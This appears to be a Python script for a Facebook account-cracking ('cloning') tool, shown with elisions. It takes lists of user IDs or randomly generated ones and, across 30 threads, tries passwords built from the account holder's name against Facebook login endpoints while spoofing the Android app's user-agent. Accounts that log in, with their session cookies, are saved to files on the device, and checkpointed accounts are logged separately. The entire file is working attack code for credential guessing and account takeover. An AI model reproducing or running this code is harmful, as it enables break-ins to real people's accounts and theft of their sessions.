...
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] GIFTED BY AHMED TULON ')
try:
    import requests 
except ImportError:
...
from concurrent.futures import ThreadPoolExecutor as ahtulonjan
from string import * 
...
sys.stdout.write('\x1b]2; AHTULON\x07')
...
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} AHMED TULON
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} AHMED'Z TULON
{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G3} FILE {A}&{G4} RANDOM CLONING
{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} GIFT
{G1}[{A}={G4}]{G4} WISH     {A}:{G4} LOVE YOU ❤️Arohi❤️
{A}──────────────────────────────────────────────────"""
...
def menu():   
    ...
    if select =='1':
        _file_()
        os.system('xdg-open https://www.facebook.com/badshax420')
    elif select =='2':
        _randm_()
        os.system('xdg-open https://www.facebook.com/badshax420')
    elif select =='3':
...
def _bd_():
    ...
    for x in range(limit):
        ...
        user.append(nmp)
    clear()
    with ahtulonjan(max_workers=30) as sexy:
        clear()
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/AHTULON.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}AHTULON-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[AHTULON-OK] {sid} | {ps} ")
                    open('/sdcard/AHTULON-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[AHTULON-CP] {sid} | {ps} ")
                     open('/sdcard/AHTULON-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                     break
                else:
                    continue
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}AHTULON-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{G1}[AHTULON-OK] {sid} | {ps} ")
                    open('/sdcard/AHTULON-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[AHTULON-CP] {sid} | {ps} ")
                    open('/sdcard/AHTULON-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            with ahtulonjan(max_workers=30) as TULON:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                TULON.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                TULON.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def randm(ids, psd):
    ...
    for pas in psd:
        sys.stdout.write(
            f"\r[LOG] [Loop: {loop}] [OK/CP: {len(ok)}/{len(cp)}] - Trying {ids} | {pas}   "
        )
        sys.stdout.flush()
        ...
        headers = {
            'User-Agent': '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:]',
        ...
        try:
            ...
            if 'access_token' in result:
                ...
                cookies = ";".join(
                    f"{cookie['name']}={cookie['value']}" for cookie in result.get("session_cookies", [])
                )
                print(f'\n[SUCCESS] {uid} | {pas}')
                with open('/sdcard/TMT-RNDM-OK.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{cookies}\n')
                ok.append(uid)
...
# Example usage
# randm("example@gmail.com", ["password123", "12345678"])
